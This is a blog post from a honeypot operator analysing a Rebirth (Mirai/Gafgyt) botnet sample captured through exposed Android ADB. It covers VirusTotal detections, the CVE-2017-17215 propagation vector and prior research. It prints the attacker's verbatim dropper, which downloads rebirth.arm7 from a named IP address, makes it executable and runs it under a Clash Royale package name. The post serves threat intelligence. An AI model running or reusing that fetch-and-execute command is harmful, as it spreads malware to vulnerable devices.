---
title: "I Captured a Rebirth Botnet Sample in My Honeypot: Here's What I Pieced Together"
date: 2026-07-09
draft: false
description: "Analysis of a Rebirth botnet sample (Mirai/Gafgyt variant) captured live in my T-Pot honeypot. Complete infection chain, the real investigation process including a dead end, and what the security community says about this family."
tags: ["Honeypot", "TPot", "Botnet", "Mirai", "Rebirth", "Gafgyt", "ADB", "Android", "IoT", "DDoS", "CVE-2017-17215", "MalwareAnalysis", "ThreatIntel", "BlueTeam"]
categories: ["Honeypot Diaries"]
---

{{< lead >}}
While reviewing traffic from my T-Pot honeypot I found something more interesting than the typical SSH brute-force attempt: a complete infection chain, captured live, that turned out to be a variant of the **Rebirth** botnet, from the Mirai/Gafgyt family. This post covers exactly what I captured, how I pieced it together to identify it, and what the security community says about this family — making clear throughout what is my direct observation and what is third-party research.
{{< /lead >}}

---

## What I Captured (this part is mine)

The honeypot that recorded this was **Adbhoney**, one of T-Pot's sensors that simulates the **ADB (Android Debug Bridge)** protocol — Android's remote debugging system, which when exposed to the internet without authentication is a trivial entry point for automated bots.

The command executed by the attacker, captured verbatim in the logs:

```bash
toybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal
chmod 777 /data/local/tmp/com.supercell.clashroyal
./data/local/tmp/com.supercell.clashroyal adb
```

Three steps, typical of an automated dropper:

1. **Downloads** a binary (`rebirth.arm7`) from a remote server, using `toybox` — a BusyBox-like utility pre-installed on most Android systems, so the attacker doesn't depend on having extra tools on the target device.
2. **Grants full execution permissions** (`chmod 777`).
3. **Executes it**, passing `adb` as an argument — without deeper binary analysis, my read is that it probably tells it to use that vector to keep spreading to other devices with exposed ADB.

The detail that caught my attention most: the file is saved as **`com.supercell.clashroyal`**, the real package name of the Clash Royale game. It's a simple camouflage technique — so that someone reviewing processes at a glance won't be suspicious.

---

## How I Pieced It Together (the real process, dead end included)

The first thing I did was take the SHA256 hash of the file, which T-Pot had automatically saved as the captured file's name:

```
849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5
```

I searched it on VirusTotal and **found nothing** — the hash wasn't in their database. At that point I didn't know whether it was a new uncatalogued sample or if I was simply searching wrong. I used the binary's name (`rebirth.arm7`, visible in the command itself) to search by text instead of hash, and there I found references — a Sysdig analysis documenting a campaign with that same filename, identifying it as part of the Rebirth botnet.

A few days later, I checked the hash on VirusTotal again and this time it was registered — probably because another researcher uploaded an identical copy captured in their own honeypot. Community comments on the entry confirm it: at least two other people report having seen it "in the wild" around the same dates as mine.

---

## What VirusTotal's Automated Analysis Shows (not mine, I'm citing it)

With the sample now indexed, here's what its entry shows:

| Field | Result |
|-------|--------|
| **Detection** | 39 out of 63 antivirus engines |
| **Popular label** | `trojan.mirai/smmr1` |
| **Categories** | trojan, dropper, worm |
| **Family labels** | mirai, smmr1, camelot |
| **Architecture** | ELF ARM — 194.51 KB |

VirusTotal also includes an automatically generated behavior summary ("Code Insights") that describes the binary as an IoT botnet from the Mirai/Gafgyt family, with self-propagation capability exploiting **CVE-2017-17215** (an RCE in Huawei HG532 routers), a module that kills competing malware processes, several DDoS attack vectors, and encrypted C2 communication.

**I have not personally verified these details by disassembling the binary** — I'm reproducing them for what they are: VirusTotal's automated reading, also backed by several community YARA rules (Elastic Security, Florian Roth/Nextron Systems) that match known signatures of Mirai and the CVE-2017-17215 exploit.

---

## What Prior Research Says About Rebirth (also not mine)

Rebirth doesn't appear to be an isolated experiment. Research published by Sysdig describes it as a **DDoS-as-a-Service** offering — a botnet for hire — allegedly administered under the alias "Docx69", promoted on Telegram and gaming streams. Earlier technical analyses place it as built on Gafgyt, with capabilities inherited from other families like QBot and STDBot.

I mention this as third-party context, not something I've confirmed independently — but it fits reasonably with the modular behavior (propagation + DDoS + anti-competition) that VirusTotal's entry does describe for this specific sample.

---

## What I'm Confident Concluding

- **A 2017 vulnerability is still an active propagation vector in 2026.** If CVE-2017-17215 keeps appearing in current malware, it's because there are still enough unpatched Huawei routers out there to make including it worthwhile.

- **Camouflage as Clash Royale works precisely because nobody expects to review an Android device's processes in depth.** You don't need a sophisticated evasion technique if nobody is looking.

- **A hash with no VirusTotal results doesn't mean "nothing interesting"** — sometimes it just means you got there before the rest of the community. Searching by other data (filename, command, IP) when the hash fails is a step I almost missed.

---

## Technical Summary

| Field | Source | Value |
|-------|--------|-------|
| Capture honeypot | Direct observation | Adbhoney (T-Pot) |
| Capture date | Direct observation | July 9, 2026 |
| Origin server | Direct observation | 94.154.43.48 |
| Actual filename | Direct observation | rebirth.arm7 |
| Disguise name | Direct observation | com.supercell.clashroyal |
| SHA256 | Direct observation | `849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5` |
| Architecture / size | VirusTotal | ELF ARM, 194.51 KB |
| Detection | VirusTotal | 39/63 |
| Family | VirusTotal / community YARA | Mirai/Gafgyt (Rebirth), smmr1 |
| Propagation CVE | VirusTotal Code Insights (not verified by me) | CVE-2017-17215 (Huawei HG532) |
| DDoS-as-a-Service context | Sysdig research | Operator alias: "Docx69" |

---

*This analysis combines direct observation in my honeypot with public threat intelligence sources (VirusTotal, Sysdig research), clearly differentiated throughout the post. At no point did I execute the binary outside the honeypot's isolated environment.*
